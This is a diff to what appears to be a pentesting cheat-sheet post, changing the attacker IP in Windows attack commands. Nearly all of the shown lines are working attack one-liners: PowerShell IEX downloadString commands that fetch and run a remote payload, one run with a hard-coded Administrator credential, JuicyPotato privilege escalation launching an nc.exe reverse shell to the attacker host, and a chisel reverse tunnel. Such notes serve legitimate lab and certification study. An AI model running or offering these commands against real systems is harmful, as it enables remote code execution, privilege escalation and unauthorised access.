@@ -12,7 +12,7 @@ layout: post
 How to use powershell to pop a second connection with interactive shell
 Open a listener on a port and a web server with payload on another.
 Then run:
-$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')"
+$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.119.1/file.ps1')"
 
 Starting a shell as Administrator (when the password is known)
 
@@ -21,7 +21,7 @@ $ $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force
 $ $cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
 
 Then pop the shell
-$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.1.1/file.ps1')" -Credential $cred
+$ Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.119.1/file.ps1')" -Credential $cred
 ```
 
 
@@ -51,9 +51,9 @@ On attacker system:
 $ nc -nvlp 80
 On target system:
 First upload nc.exe & JuicyPotato.exe, and place it in current dir
-$ JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -t *
+$ JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.119.1 80" -t *
 Or using a different CLSID:
-$ JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.1.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
+$ JuicyPotato.exe -l 80 -p c:\cmd.exe -a "/c c:\nc.exe -e cmd.exe 192.168.119.1 80" -c {03ca98d6-ff5d-49b8-abc6-03dd84127020} -t *
 ```
 
 ###### Autologon Credentials in registry
@@ -100,7 +100,7 @@ https://github.com/jpillora/chisel
 $ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
 
 3 run chisel on the target
-$ .\c.exe client 192.168.1.1:8000 R:8888:localhost:8888
+$ .\c.exe client 192.168.119.1:8000 R:8888:localhost:8888
 
 4 see if the connection is made
 port 8888 on kali should be listening now:
